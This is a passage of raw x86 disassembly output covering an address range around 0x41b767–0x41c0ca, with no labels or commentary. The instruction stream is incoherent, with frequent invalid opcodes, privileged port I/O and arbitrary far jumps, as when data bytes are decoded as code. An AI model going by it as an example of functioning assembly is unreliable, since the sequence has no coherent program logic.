  41b767:	inc    ecx
  41b768:	sub    esi,DWORD PTR [eax]
  41b76a:	xor    ebp,ebx
  41b76c:	mov    ebp,0xc6d4ec2b
  41b771:	xchg   ebp,eax
  41b772:	mov    al,ds:0x32771a9c
  41b777:	mov    ch,0xf
  41b779:	mov    dh,0xa6
  41b77b:	lock push ds
  41b77d:	outs   dx,DWORD PTR ds:[esi]
  41b77e:	inc    BYTE PTR [edi-0x75]
  41b781:	xor    BYTE PTR [esi],0xc9
  41b784:	adc    BYTE PTR [ecx+0x4c1ae1a7],al
  41b78a:	xchg   BYTE PTR [ebx],ch
  41b78c:	mov    ds:0x18b0e967,eax
  41b791:	adc    esp,esp
  41b793:	mov    BYTE PTR ds:0xdf5d9b41,dl
  41b799:	jae    0x41b747
  41b79b:	scas   eax,DWORD PTR es:[edi]
  41b79c:	mov    ds:0xcf8e9115,al
  41b7a1:	or     al,0xbb
  41b7a3:	mov    esp,0xafe315ed
  41b7a8:	aas    
  41b7a9:	or     BYTE PTR [eax+0x37],ah
  41b7ac:	outs   dx,BYTE PTR ds:[esi]
  41b7ad:	pop    esi
  41b7ae:	add    ebp,DWORD PTR ds:0xe8d22542
  41b7b4:	lea    ecx,ds:0xe32b7901
  41b7ba:	les    ecx,FWORD PTR [ebx]
  41b7bc:	sub    eax,0x37d60d2e
  41b7c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7c2:	inc    edi
  41b7c3:	js     0x41b819
  41b7c5:	cwde   
  41b7c6:	adc    bl,0xdd
  41b7c9:	mov    bl,0xbe
  41b7cb:	retf   0x693b
  41b7ce:	jp     0x41b791
  41b7d0:	xor    ecx,DWORD PTR [edi-0x43cfc98]
  41b7d6:	aam    0xe
  41b7d8:	pop    es
  41b7d9:	pop    ss
  41b7da:	jnp    0x41b7e1
  41b7dc:	inc    ecx
  41b7dd:	jb     0x41b83b
  41b7df:	jb     0x41b797
  41b7e1:	inc    eax
  41b7e2:	loop   0x41b7d7
  41b7e4:	lods   al,BYTE PTR ds:[esi]
  41b7e5:	xchg   DWORD PTR [esi+0x5f],eax
  41b7e8:	inc    edx
  41b7e9:	lods   al,BYTE PTR ds:[esi]
  41b7ea:	fcmovne st,st(1)
  41b7ec:	movd   ecx,mm6
  41b7ef:	mov    ds:0x9275ee63,eax
  41b7f4:	ficomp DWORD PTR ds:0xe279af30
  41b7fa:	mov    al,ds:0xcc774a44
  41b7ff:	in     eax,0x1
  41b801:	outs   dx,DWORD PTR ds:[esi]
  41b802:	cmp    ebx,0xffffff87
  41b805:	inc    eax
  41b806:	push   ebp
  41b807:	inc    ebp
  41b808:	(bad)  
  41b80a:	rcr    ch,cl
  41b80c:	jecxz  0x41b7da
  41b80e:	fwait
  41b80f:	adc    al,BYTE PTR [eax]
	...
  41b871:	add    BYTE PTR [eax],al
  41b873:	add    BYTE PTR [edx-0x8b13804],cl
  41b879:	jg     0x41b806
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0xd2
  41b881:	pop    esp
  41b882:	sar    esp,0x20
  41b885:	and    al,0x1
  41b887:	add    BYTE PTR [ecx+eax*1],al
  41b88a:	add    BYTE PTR [eax],al
  41b88c:	or     DWORD PTR [edx+0x353058a4],eax
  41b892:	xor    ch,dl
  41b894:	scas   eax,DWORD PTR es:[edi]
  41b895:	add    BYTE PTR [esi+0x31],ah
  41b898:	mov    esi,0x92b86938
  41b89d:	jmp    0x929d:0xbb697841
  41b8a4:	sub    ecx,edx
  41b8a6:	std    
  41b8a7:	jg     0x41b8ef
  41b8a9:	mov    bh,0x5
  41b8ab:	xor    edx,DWORD PTR [esi-0x6f]
  41b8ae:	mov    ch,0x4a
  41b8b0:	call   0x55f447bc
  41b8b5:	sub    al,0xe3
  41b8b7:	lods   eax,DWORD PTR ds:[esi]
  41b8b8:	xor    BYTE PTR [esi],bh
  41b8ba:	dec    esp
  41b8bb:	jle    0x41b8f2
  41b8bd:	retf   
  41b8be:	fld    QWORD PTR [ebp+0x12233fe8]
  41b8c4:	mov    ecx,0x37ed8edc
  41b8c9:	mov    BYTE PTR [eax-0x7b31fd7c],bl
  41b8cf:	call   0x1897:0xd3da49af
  41b8d6:	mov    cs,WORD PTR [edi+0x5c]
  41b8d9:	jp     0x41b885
  41b8db:	xchg   ebp,eax
  41b8dc:	inc    esp
  41b8dd:	ficom  WORD PTR [ecx+ebp*4-0x3afdf2a0]
  41b8e4:	sbb    esp,DWORD PTR [ebp+0x3e]
  41b8e7:	cmp    al,0xcb
  41b8e9:	push   0xe6f242b6
  41b8ee:	inc    edi
  41b8ef:	or     eax,0xa5d4a6d
  41b8f4:	or     BYTE PTR [ecx+ecx*4],0x9c
  41b8f8:	mov    cl,0x3f
  41b8fa:	test   BYTE PTR [eax+0x17daf22b],0xb3
  41b901:	test   BYTE PTR [edx],bh
  41b903:	scas   ax,WORD PTR es:[edi]
  41b905:	int3   
  41b906:	dec    esp
  41b907:	mov    ds:0xf8338bd,eax
  41b90c:	fwait
  41b90d:	push   es
  41b90e:	test   eax,0xe4fb003
  41b913:	xor    al,0x2d
  41b915:	xor    BYTE PTR [ecx-0x7957c77],0x3e
  41b91c:	mov    dh,0x24
  41b91e:	and    bh,BYTE PTR [eax-0x14]
  41b921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b922:	jnp    0x41b962
  41b924:	into   
  41b925:	call   0xe85f7966
  41b92a:	das    
  41b92b:	fstp   DWORD PTR [esp+eax*2]
  41b92e:	fimul  WORD PTR [edx]
  41b930:	mov    dh,0x6b
  41b932:	mov    cl,0xfd
  41b934:	cmp    al,bh
  41b936:	mov    dl,0x8e
  41b938:	push   ebx
  41b939:	inc    ebp
  41b93a:	not    esp
  41b93c:	mov    al,0xc1
  41b93e:	push   cs
  41b93f:	jnp    0x41b9a8
  41b941:	retf   0x73e3
  41b944:	mov    eax,ds:0x13af233a
  41b949:	push   esp
  41b94a:	dec    edx
  41b94b:	stos   DWORD PTR es:[edi],eax
  41b94c:	in     eax,dx
  41b94d:	sti    
  41b94e:	mov    DWORD PTR [eax-0x66],ecx
  41b951:	pop    esi
  41b952:	sub    BYTE PTR [ecx-0x26],ah
  41b955:	pop    ss
  41b956:	mov    al,0x63
  41b958:	pop    ss
  41b959:	jg     0x41b988
  41b95b:	jg     0x41b949
  41b95d:	dec    bx
  41b95f:	xchg   edx,eax
  41b960:	pop    ds
  41b961:	pop    esi
  41b962:	dec    edi
  41b963:	int    0x43
  41b965:	in     eax,0x58
  41b967:	sub    al,0x0
  41b969:	hlt    
  41b96a:	dec    eax
  41b96b:	(bad)  
  41b96c:	or     dh,cl
  41b96e:	mov    al,0x66
  41b970:	aam    0x4b
  41b972:	jge    0x41b9e5
  41b974:	popa   
  41b975:	xor    esi,DWORD PTR [edi+0x1b]
  41b978:	loopne 0x41b9df
  41b97a:	dec    edi
  41b97b:	xchg   edi,eax
  41b97c:	dec    edi
  41b97d:	test   al,0xf7
  41b97f:	(bad)  
  41b980:	das    
  41b981:	into   
  41b982:	xor    ebp,ecx
  41b984:	mov    al,ds:0xc73930ed
  41b989:	aaa    
  41b98a:	push   ss
  41b98b:	cdq    
  41b98c:	shl    DWORD PTR [edx],0xe4
  41b98f:	repnz add BYTE PTR [eax],al
	...
  41b9f2:	add    BYTE PTR [eax],al
  41b9f4:	ret    
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	inc    esp
  41ba01:	mov    esp,0x25246585
  41ba06:	add    DWORD PTR [eax],eax
  41ba08:	add    al,0x1
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	loope  0x41ba3a
  41ba0e:	cmp    DWORD PTR ds:0x70eb4df2,eax
  41ba14:	out    0x1c,eax
  41ba16:	sbb    al,0xba
  41ba18:	mov    cl,bl
  41ba1a:	cwde   
  41ba1b:	(bad)  
  41ba1c:	jp     0x41ba1e
  41ba1e:	inc    esi
  41ba1f:	gs js  0x41ba2b
  41ba22:	sub    DWORD PTR [esi-0x64],edi
  41ba25:	fstp   TBYTE PTR [ebx+0x7f]
  41ba28:	clc    
  41ba29:	retf   0x7ec0
  41ba2c:	jl     0x41ba2e
  41ba2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba2f:	test   DWORD PTR [edx+0x19d80e3f],ebx
  41ba35:	scas   al,BYTE PTR es:[edi]
  41ba36:	mov    dh,0xe5
  41ba38:	rcr    BYTE PTR [ebx],cl
  41ba3a:	sub    esp,esi
  41ba3c:	push   ebx
  41ba3d:	adc    BYTE PTR [esp+ebx*1+0x1],cl
  41ba41:	addr16 fadd st,st(6)
  41ba44:	cwde   
  41ba45:	div    DWORD PTR [ebx+edi*2-0x7caab0f6]
  41ba4c:	int3   
  41ba4d:	test   ah,bl
  41ba4f:	fidiv  WORD PTR [esi]
  41ba51:	(bad)  
  41ba52:	pusha  
  41ba53:	mov    ds:0x8406b05b,eax
  41ba58:	pop    esp
  41ba59:	sub    DWORD PTR [eax],eax
  41ba5b:	jne    0x41ba66
  41ba5d:	stos   BYTE PTR es:[edi],al
  41ba5e:	inc    eax
  41ba5f:	retf   0x33cb
  41ba62:	aad    0x23
  41ba64:	fsubr  DWORD PTR [ebp+0x72ce3f31]
  41ba6a:	(bad)  
  41ba6c:	adc    BYTE PTR [edx],0x6e
  41ba6f:	inc    ecx
  41ba70:	ja     0x41ba0f
  41ba72:	pop    eax
  41ba73:	sar    dl,cl
  41ba75:	(bad)  
  41ba76:	stos   BYTE PTR es:[edi],al
  41ba77:	(bad)  
  41ba78:	mov    ah,0xba
  41ba7a:	xor    al,0x53
  41ba7c:	scas   al,BYTE PTR es:[edi]
  41ba7d:	xchg   esp,eax
  41ba7e:	lds    ecx,FWORD PTR [edi]
  41ba80:	lds    esi,FWORD PTR [edx-0xf]
  41ba83:	pmaxsw mm0,mm7
  41ba86:	out    dx,al
  41ba87:	arpl   bx,si
  41ba89:	mov    ch,0x9d
  41ba8b:	enter  0xf752,0x94
  41ba8f:	pop    es
  41ba90:	in     eax,0x9c
  41ba92:	sbb    al,0xb8
  41ba94:	mov    esi,0xabff7230
  41ba99:	or     eax,0xfed890d9
  41ba9e:	jnp    0x41ba94
  41baa0:	aad    0x75
  41baa2:	lds    edx,FWORD PTR [ebp+0x62491c43]
  41baa8:	jne    0x41ba5d
  41baaa:	jbe    0x41badc
  41baac:	pop    esi
  41baad:	pop    ecx
  41baae:	stos   BYTE PTR es:[edi],al
  41baaf:	cmp    ebx,ebp
  41bab1:	pusha  
  41bab2:	rcr    BYTE PTR [edx],cl
  41bab4:	pop    ds
  41bab5:	out    0x69,al
  41bab7:	jnp    0x41ba6b
  41bab9:	cmp    edx,DWORD PTR [eax+esi*1+0x49]
  41babd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41babe:	lods   al,BYTE PTR ds:[esi]
  41babf:	mov    ss,WORD PTR [ebp+0x7d]
  41bac2:	imul   edi,DWORD PTR [eax-0x652b1d0c],0x3b
  41bac9:	or     DWORD PTR [esi-0x3],0xffffffb5
  41bacd:	outs   dx,BYTE PTR ds:[esi]
  41bace:	outs   dx,DWORD PTR ds:[esi]
  41bacf:	push   es
  41bad0:	and    DWORD PTR [ebx+ebp*8],0x10ea126
  41bad7:	add    ecx,DWORD PTR [ebp-0x6ff900e0]
  41badd:	inc    edx
  41bade:	mov    ecx,0x6dec5a28
  41bae3:	je     0x41ba72
  41bae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bae6:	sub    edx,DWORD PTR [ebx-0x36]
  41bae9:	cli    
  41baea:	bound  eax,QWORD PTR [ebx]
  41baec:	fcom   QWORD PTR [edx+0x1c]
  41baef:	imul   edx,ecx,0xffffffb3
  41baf2:	daa    
  41baf3:	push   ebp
  41baf4:	es jb  0x41bad7
  41baf7:	(bad)  
  41baf8:	(bad)  
  41baf9:	pusha  
  41bafa:	nop
  41bafb:	dec    ebp
  41bafc:	push   edi
  41bafd:	into   
  41bafe:	ins    BYTE PTR es:[edi],dx
  41baff:	adc    eax,esp
  41bb01:	sbb    al,0x20
  41bb03:	in     al,dx
  41bb04:	(bad)  
  41bb05:	iret   
  41bb06:	outs   dx,DWORD PTR ds:[esi]
  41bb07:	ffreep st(2)
  41bb09:	in     eax,dx
  41bb0a:	scas   al,BYTE PTR es:[edi]
  41bb0b:	ret    0xbd3e
  41bb0e:	adc    al,0xab
	...
  41bb74:	or     bh,BYTE PTR [eax-0x4048555b]
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi-0x22],cx
  41bb81:	ins    DWORD PTR es:[edi],dx
  41bb82:	sub    ecx,DWORD PTR [ebp+0x28]
  41bb85:	add    DWORD PTR es:[eax],eax
  41bb88:	add    al,0x1
  41bb8a:	add    BYTE PTR [eax],al
  41bb8c:	xchg   DWORD PTR [esi+0xf],eax
  41bb8f:	(bad)  
  41bb90:	gs dec edi
  41bb92:	xchg   esi,eax
  41bb93:	mov    eax,0xe3f1dc15
  41bb98:	push   ss
  41bb99:	push   ecx
  41bb9a:	call   0xaf2c6983
  41bb9f:	xor    al,0xaf
  41bba1:	pop    edi
  41bba2:	mov    esi,0xc51cb0f6
  41bba7:	stos   DWORD PTR es:[edi],eax
  41bba8:	mov    esi,0xa4df52d2
  41bbad:	add    eax,0xb0bf7fe3
  41bbb2:	dec    esi
  41bbb3:	mov    edx,0x9a2b3bf0
  41bbb8:	scas   al,BYTE PTR es:[edi]
  41bbb9:	xchg   ebx,eax
  41bbba:	mov    ds:0xc8208a77,al
  41bbbf:	and    esi,DWORD PTR [ecx+eax*8-0x1e80d56a]
  41bbc6:	adc    eax,0x51273297
  41bbcb:	xchg   edx,eax
  41bbcc:	inc    ebx
  41bbcd:	out    0xe2,eax
  41bbcf:	pop    ss
  41bbd0:	mov    ch,0x9d
  41bbd2:	cld    
  41bbd3:	sbb    ah,BYTE PTR [edi]
  41bbd5:	dec    ebp
  41bbd6:	dec    esp
  41bbd7:	retf   
  41bbd8:	push   edx
  41bbd9:	mov    edi,DWORD PTR [ecx]
  41bbdb:	sbb    edx,DWORD PTR [ebx-0x7695efb2]
  41bbe1:	and    al,0x88
  41bbe3:	in     eax,dx
  41bbe4:	sahf   
  41bbe5:	xor    eax,0x26626b4
  41bbea:	mov    BYTE PTR [esi],ch
  41bbec:	inc    ebx
  41bbed:	cmp    esi,DWORD PTR [ebx-0xb]
  41bbf0:	in     eax,0x98
  41bbf2:	repz mov ch,0x91
  41bbf5:	xlat   BYTE PTR ds:[ebx]
  41bbf6:	xchg   edx,eax
  41bbf7:	inc    esp
  41bbf8:	push   edi
  41bbf9:	ss pop edi
  41bbfb:	out    0x8e,eax
  41bbfd:	cmp    bh,dh
  41bbff:	sbb    edi,DWORD PTR [ecx+0x4f6c00b1]
  41bc05:	outs   dx,DWORD PTR ds:[esi]
  41bc06:	xor    al,0x16
  41bc08:	adc    esi,DWORD PTR [eax-0x74]
  41bc0b:	sti    
  41bc0c:	addr16 int 0x6f
  41bc0f:	push   edi
  41bc10:	pushf  
  41bc11:	bound  ecx,QWORD PTR [ecx]
  41bc13:	mov    edi,?
  41bc15:	or     DWORD PTR [edi+eax*2+0x72],0x5d
  41bc1a:	mov    al,ds:0x87041d2c
  41bc1f:	out    0x1d,eax
  41bc21:	dec    esi
  41bc22:	pop    esp
  41bc23:	aad    0xac
  41bc25:	pop    ss
  41bc26:	scas   al,BYTE PTR es:[edi]
  41bc27:	xor    al,0x86
  41bc29:	in     eax,dx
  41bc2a:	mov    ch,0x8
  41bc2c:	(bad)
  41bc2f:	adc    DWORD PTR [edi+0x4585cefe],ecx
  41bc35:	cmp    ebx,eax
  41bc37:	xor    bl,0xa
  41bc3a:	push   ecx
  41bc3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc3c:	dec    ebx
  41bc3d:	call   0x5a43:0x7230fbfa
  41bc44:	jp     0x41bbd4
  41bc46:	ds and dl,al
  41bc49:	xor    DWORD PTR [edx+0x3],esp
  41bc4c:	ror    esp,0xd4
  41bc4f:	inc    esp
  41bc50:	popf   
  41bc51:	out    dx,al
  41bc52:	jmp    0x8a8bdb
  41bc57:	retf   0x69b9
  41bc5a:	jb     0x41bc38
  41bc5c:	mov    edx,0x70fa0ddb
  41bc61:	xchg   ecx,eax
  41bc62:	or     DWORD PTR [edx],esp
  41bc64:	mov    WORD PTR [ebp+0x1224bad0],cs
  41bc6a:	rol    DWORD PTR [edx],0x7e
  41bc6d:	das    
  41bc6e:	xchg   esi,eax
  41bc6f:	push   ebx
  41bc70:	ja     0x41bc00
  41bc72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc73:	aas    
  41bc74:	and    eax,0xcc5e1aa7
  41bc79:	bnd je 0x41bbff
  41bc7c:	mov    DWORD PTR [esi+0x524eb942],edi
  41bc82:	(bad)  
  41bc83:	jecxz  0x41bcbc
  41bc85:	(bad)  
  41bc86:	ds and al,0xa4
  41bc89:	test   DWORD PTR [esi],esi
  41bc8b:	add    cl,BYTE PTR [ebp+0x19]
  41bc8e:	mov    cl,BYTE PTR [ebp+0x0]
	...
  41bcf4:	shl    BYTE PTR [edx],cl
  41bcf6:	cli    
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x32ced9d8
  41bd02:	mov    ebx,0x1272cd9
  41bd07:	add    BYTE PTR [ecx+eax*1],al
  41bd0a:	add    BYTE PTR [eax],al
  41bd0c:	xor    bh,dh
  41bd0e:	dec    ecx
  41bd0f:	push   ecx
  41bd10:	stos   BYTE PTR es:[edi],al
  41bd11:	mov    ch,BYTE PTR [eax+0x34]
  41bd14:	pusha  
  41bd15:	scas   al,BYTE PTR es:[edi]
  41bd16:	fdivr  QWORD PTR [ebx]
  41bd18:	cmp    eax,0x767cb7f8
  41bd1d:	into   
  41bd1e:	pop    ds
  41bd1f:	punpckhwd mm1,QWORD PTR [ebx]
  41bd22:	sar    DWORD PTR [ecx-0x5f7ff3ad],cl
  41bd28:	push   0x57
  41bd2a:	in     al,dx
  41bd2b:	cmc    
  41bd2c:	shr    edx,0xba
  41bd2f:	mov    edi,0x6d831c5e
  41bd34:	ins    DWORD PTR es:[edi],dx
  41bd35:	adc    al,0xc0
  41bd37:	xchg   esi,eax
  41bd38:	pop    esi
  41bd39:	mov    edi,0x480bfbf0
  41bd3e:	fisub  WORD PTR [ecx]
  41bd40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd41:	out    0xc3,eax
  41bd43:	in     eax,dx
  41bd44:	lahf   
  41bd45:	inc    eax
  41bd46:	mov    eax,0xccb0848f
  41bd4b:	inc    eax
  41bd4c:	jle    0x41bd0e
  41bd4e:	int    0xf
  41bd50:	push   ebp
  41bd51:	adc    edi,DWORD PTR [ebp+0x74be19fd]
  41bd57:	fwait
  41bd58:	jo     0x41bd43
  41bd5a:	jp     0x41bd72
  41bd5c:	push   eax
  41bd5d:	fcomp  QWORD PTR [ecx]
  41bd5f:	xor    edx,DWORD PTR [eax-0x150489bc]
  41bd65:	jns    0x41bd21
  41bd67:	push   ds
  41bd68:	jmp    0xbf9d:0x6e651d95
  41bd6f:	shl    DWORD PTR [eax-0x4285ba6d],0xb
  41bd76:	es pop eax
  41bd78:	cmp    esp,DWORD PTR [edi+0x28a153f3]
  41bd7e:	push   eax
  41bd7f:	xchg   DWORD PTR [eax-0x6ec3063f],esp
  41bd85:	std    
  41bd86:	inc    ebp
  41bd87:	mov    bl,0x95
  41bd89:	retf   0xb8a5
  41bd8c:	(bad)  
  41bd8d:	mov    BYTE PTR [si-0x17],0x78
  41bd92:	inc    esp
  41bd93:	xchg   ebx,eax
  41bd94:	out    0xd2,eax
  41bd96:	(bad)  [eax-0x44]
  41bd99:	lock repz out dx,al
  41bd9c:	push   esi
  41bd9d:	fld    DWORD PTR [esi-0x7e98c94]
  41bda4:	aas    
  41bda5:	mov    al,BYTE PTR [edi]
  41bda7:	sar    BYTE PTR ds:0xb986a032,cl
  41bdad:	out    dx,al
  41bdae:	jbe    0x41bd87
  41bdb0:	cmc    
  41bdb1:	imul   edx,DWORD PTR [ebx],0xffffffad
  41bdb4:	fmul   DWORD PTR [eax-0x33]
  41bdb7:	pop    ebp
  41bdb8:	pop    ecx
  41bdb9:	push   ss
  41bdba:	loope  0x41bdb1
  41bdbc:	arpl   WORD PTR [ecx+eiz*1],si
  41bdbf:	(bad)  [eax+0x4ed3d370]
  41bdc5:	xchg   esp,eax
  41bdc6:	mov    esp,0x214f8b18
  41bdcb:	cmp    al,BYTE PTR [esi+0x5956d8a2]
  41bdd1:	mov    WORD PTR [ecx+ecx*4+0x69],fs
  41bdd5:	shl    BYTE PTR [eax-0x6d],0xbd
  41bdd9:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41bddb:	popf   
  41bddc:	dec    ebp
  41bddd:	or     DWORD PTR [ecx],edi
  41bddf:	mov    eax,0xf4cebc94
  41bde4:	mov    BYTE PTR [edi],dl
  41bde6:	sti    
  41bde7:	aad    0x3e
  41bde9:	(bad)
  41bdec:	loope  0x41be12
  41bdee:	mov    ?,WORD PTR [edi+0x41ecfb05]
  41bdf4:	(bad)  
  41bdf5:	fst    DWORD PTR [edx-0x59]
  41bdf8:	shr    BYTE PTR [eax-0x6f],1
  41bdfb:	add    al,0x66
  41bdfd:	imul   eax,ecx,0xcd063b72
  41be03:	mov    dl,0x6a
  41be05:	mov    eax,0x93fa65ef
  41be0a:	or     DWORD PTR [esi-0x7a],edx
  41be0d:	mov    dl,0x63
  41be0f:	call   0x0:0x0
	...
  41be72:	add    BYTE PTR [eax],al
  41be74:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41be7a:	imul   edi
  41be7c:	mov    ebp,DWORD PTR [ecx-0x4375c09a]
  41be82:	shl    BYTE PTR ds:0x12830,1
  41be88:	add    al,0x1
  41be8a:	add    BYTE PTR [eax],al
  41be8c:	mov    dl,0xfb
  41be8e:	and    edi,eax
  41be90:	adc    eax,DWORD PTR [ebp+0x17]
  41be93:	jl     0x41be78
  41be95:	sar    DWORD PTR [ecx],0xa9
  41be98:	push   edx
  41be99:	push   ss
  41be9a:	cmp    DWORD PTR [edx+0x58],eax
  41be9d:	hlt    
  41be9e:	push   esp
  41be9f:	dec    esp
  41bea0:	mov    cl,0x31
  41bea2:	loop   0x41be38
  41bea4:	pop    eax
  41bea5:	add    BYTE PTR [edx],bh
  41bea7:	or     DWORD PTR ds:0x8e571463,ebp
  41bead:	cmp    ah,BYTE PTR [ecx]
  41beaf:	ret    
  41beb0:	add    al,0x7d
  41beb2:	mov    cl,0xf5
  41beb4:	push   ds
  41beb5:	mov    eax,0x2f2d0cd8
  41beba:	xchg   edx,eax
  41bebb:	rol    edx,1
  41bebd:	call   0x20423b6a
  41bec2:	out    0xde,eax
  41bec4:	ficomp WORD PTR [ebp+0x6b]
  41bec7:	cmp    al,cl
  41bec9:	push   0xffffff95
  41becb:	pop    ecx
  41becc:	pop    esi
  41becd:	xchg   BYTE PTR ds:[eax-0x38],cl
  41bed1:	test   eax,0x6be4eb8b
  41bed6:	enter  0xc2f9,0x92
  41beda:	imul   edi,DWORD PTR [edi+0x20abeb55],0xffffffd4
  41bee1:	fld    st(4)
  41bee3:	jb     0x41bf59
  41bee5:	xor    edi,ecx
  41bee7:	ret    0xa4dc
  41beea:	popa   
  41beeb:	(bad)  
  41beec:	lahf   
  41beed:	loope  0x41bef0
  41beef:	repz dec edi
  41bef1:	(bad)  
  41bef2:	call   0xfc7b:0xef542ed7
  41bef9:	mov    edi,0x64d10d0e
  41befe:	inc    edi
  41beff:	adc    BYTE PTR [ecx],bl
  41bf01:	stc    
  41bf02:	iret   
  41bf03:	lea    ebp,[ecx]
  41bf05:	sub    ebp,ebp
  41bf07:	repnz inc esi
  41bf09:	mov    dl,0x16
  41bf0b:	shl    DWORD PTR [edx],cl
  41bf0d:	sar    BYTE PTR [edx],0x53
  41bf10:	mov    ecx,0x5f7adecd
  41bf15:	jmp    0x394721ac
  41bf1a:	(bad)  
  41bf1c:	xchg   ebx,eax
  41bf1d:	pop    esp
  41bf1e:	je     0x41bec1
  41bf20:	imul   ebp,DWORD PTR [ecx+0x4e22ca3f],0x6b
  41bf27:	sbb    dh,cl
  41bf29:	mov    ch,0xc3
  41bf2b:	aam    0xb4
  41bf2d:	sti    
  41bf2e:	xor    al,0x6b
  41bf30:	push   es
  41bf31:	in     eax,0x2e
  41bf33:	cwde   
  41bf34:	int3   
  41bf35:	nop
  41bf36:	aad    0xa9
  41bf38:	jl     0x41bef4
  41bf3a:	nop
  41bf3b:	sub    DWORD PTR [eax],0x4a
  41bf3e:	pop    ebx
  41bf3f:	jne    0x41bfad
  41bf41:	mov    ds:0xc310fbd5,eax
  41bf46:	or     eax,0xe6f81b9d
  41bf4b:	stos   BYTE PTR es:[edi],al
  41bf4c:	ret    0xb19
  41bf4f:	pop    ebx
  41bf50:	pop    edx
  41bf51:	jb     0x41bf97
  41bf53:	mov    es,edx
  41bf55:	ins    BYTE PTR es:[edi],dx
  41bf56:	shr    BYTE PTR [edx],1
  41bf58:	cli    
  41bf59:	jne    0x41bf3e
  41bf5b:	add    BYTE PTR [edi],0xe2
  41bf5e:	push   cs
  41bf5f:	repnz pop es
  41bf61:	sub    esp,eax
  41bf63:	push   cx
  41bf65:	fstp   QWORD PTR [esi+0x34]
  41bf68:	add    esp,DWORD PTR [ebx-0x14]
  41bf6b:	repz fadd QWORD PTR ds:[ebx]
  41bf6f:	not    BYTE PTR [esi+0x6bd693a7]
  41bf75:	xchg   DWORD PTR [edx],esi
  41bf77:	push   edx
  41bf78:	jb     0x41bf25
  41bf7a:	xor    eax,DWORD PTR [edx+eax*1-0x63]
  41bf7e:	rol    DWORD PTR [esi-0x6b],cl
  41bf81:	push   ds
  41bf82:	dec    edx
  41bf83:	mov    es,WORD PTR [ebx+0x25]
  41bf86:	mov    bl,0x4e
  41bf88:	dec    esp
  41bf89:	rol    BYTE PTR [ebx],cl
  41bf8b:	dec    esi
  41bf8c:	in     eax,dx
  41bf8d:	or     al,0xdf
  41bf8f:	jb     0x41bf91
	...
  41bff1:	add    BYTE PTR [eax],al
  41bff3:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	imul   eax,edi,0x6b
  41c003:	sbb    DWORD PTR [ecx+ebp*1],esi
  41c006:	add    DWORD PTR [eax],eax
  41c008:	add    al,0x1
  41c00a:	add    BYTE PTR [eax],al
  41c00c:	clc    
  41c00d:	jge    0x41c025
  41c00f:	push   eax
  41c010:	int3   
  41c011:	sub    BYTE PTR [esi],ah
  41c013:	sub    ecx,0x22
  41c016:	retf   0xdc24
  41c019:	and    dl,al
  41c01b:	shl    ch,0x40
  41c01e:	in     al,0xf9
  41c020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c021:	(bad)  
  41c025:	cs in  al,0x81
  41c028:	xor    al,0x64
  41c02a:	in     al,0x43
  41c02c:	add    al,0xe5
  41c02e:	int    0x4c
  41c030:	call   DWORD PTR [esi]
  41c032:	out    0x1f,eax
  41c034:	iret   
  41c035:	sub    ecx,esp
  41c037:	hlt    
  41c038:	xchg   DWORD PTR [esi],esi
  41c03a:	push   ecx
  41c03b:	into   
  41c03c:	ficom  DWORD PTR [ecx-0x440bb7cd]
  41c042:	sbb    eax,0xa6ce8540
  41c047:	das    
  41c048:	adc    al,cl
  41c04a:	(bad)  
  41c04b:	jecxz  0x41c05e
  41c04d:	data16 adc bl,bl
  41c050:	dec    eax
  41c051:	ds jle 0x41c073
  41c054:	mov    bh,0xfe
  41c056:	xchg   DWORD PTR [edx],esi
  41c058:	sub    edi,DWORD PTR [edi-0x546a005c]
  41c05e:	ins    DWORD PTR es:[edi],dx
  41c05f:	add    DWORD PTR [edx+0x1d],eax
  41c062:	aam    0x1e
  41c064:	ret    
  41c065:	push   es
  41c066:	out    0x33,al
  41c068:	mov    ebx,0x418eed91
  41c06d:	imul   DWORD PTR [edi-0x46738560]
  41c073:	out    dx,al
  41c074:	xchg   edx,eax
  41c075:	ins    BYTE PTR es:[edi],dx
  41c076:	in     eax,dx
  41c077:	bound  esi,QWORD PTR [esi-0x51]
  41c07a:	retf   0x6c3
  41c07d:	iret   
  41c07e:	jle    0x41c04c
  41c080:	mov    dh,0x5a
  41c082:	pop    eax
  41c083:	sub    DWORD PTR [ecx],0x56c9d082
  41c089:	inc    ebp
  41c08a:	adc    edx,DWORD PTR [esi-0x6]
  41c08d:	mov    ch,0x87
  41c08f:	(bad)  
  41c091:	sbb    eax,0xeb96bbdd
  41c096:	xor    DWORD PTR [esi+0x1db9c33e],esp
  41c09c:	mov    ebp,0x6a7f06f4
  41c0a1:	jecxz  0x41c04f
  41c0a3:	cld    
  41c0a4:	shr    BYTE PTR [edi+0x4a],1
  41c0a7:	xchg   esi,eax
  41c0a8:	jmp    0x9a10:0x54cecfa8
  41c0af:	fwait
  41c0b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0b1:	sub    ecx,DWORD PTR fs:[esi-0x6441ecf3]
  41c0b8:	xchg   edx,eax
  41c0b9:	xor    DWORD PTR [esi-0x5892ec96],0xc7a4c509
  41c0c3:	adc    esp,DWORD PTR [esi+0x18d932b9]
  41c0c9:	in     al,dx
  41c0ca:	daa    
